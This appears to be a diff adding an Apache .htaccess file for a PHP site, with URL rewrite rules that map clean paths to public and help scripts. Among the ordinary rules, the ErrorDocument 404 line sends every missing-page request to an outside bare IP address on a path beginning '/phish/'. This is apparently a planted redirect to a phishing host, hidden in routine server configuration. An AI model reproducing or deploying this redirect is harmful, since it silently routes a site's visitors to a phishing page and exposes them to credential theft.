@@ -1,0 +1,22 @@
+Options +FollowSymLinks
+RewriteEngine On
+php_flag session.bug_compat_42 1
+php_flag session.bug_compat_warn 0
+#RewriteCond %{REQUEST_FILENAME} -f
+#RewriteCond %{REQUEST_FILENAME} !-d
+
+
+
+RewriteRule ^$ public/index.php [PT,L]
+RewriteRule ^([a-zA-Z0-9-_]+)$ public/$1.php [PT,L]
+RewriteRule ^([a-zA-Z0-9-_]+)/([a-zA-Z0-9-_]+)/([a-zA-Z0-9-_]+)$ public/$1.php?typ=$2&pg=$3 [PT,L]
+
+ErrorDocument 404 http://182.72.7.132/phish/error/404/143b531769d4466ef9d52c07981c7578
+
+#RewriteRule ^admin/$ tspadmin/index.php [PT,L]
+#RewriteRule ^admin/([a-zA-Z0-9-_]+)$ tspadmin/$1.php [PT,L]
+#RewriteRule ^admin/([a-zA-Z0-9-_]+)/([a-zA-Z0-9-_]+)/([a-zA-Z0-9-_]+)$ tspadmin/$1.php?typ=$2&pg=$3 [PT,L]
+
+RewriteRule ^(help|faq|other)/$ help/index.php [PT,L]
+RewriteRule ^(help|faq|other)/([a-zA-Z0-9-_]+)$ help/index.php?typ=$1&pg=$2 [PT,L]
+RewriteRule ^(help|faq|other)/([a-zA-Z0-9-_]+)/([a-zA-Z0-9-_]+)$ help/index.php?typ=$1&pg=$2&lnk=$3 [PT,L]
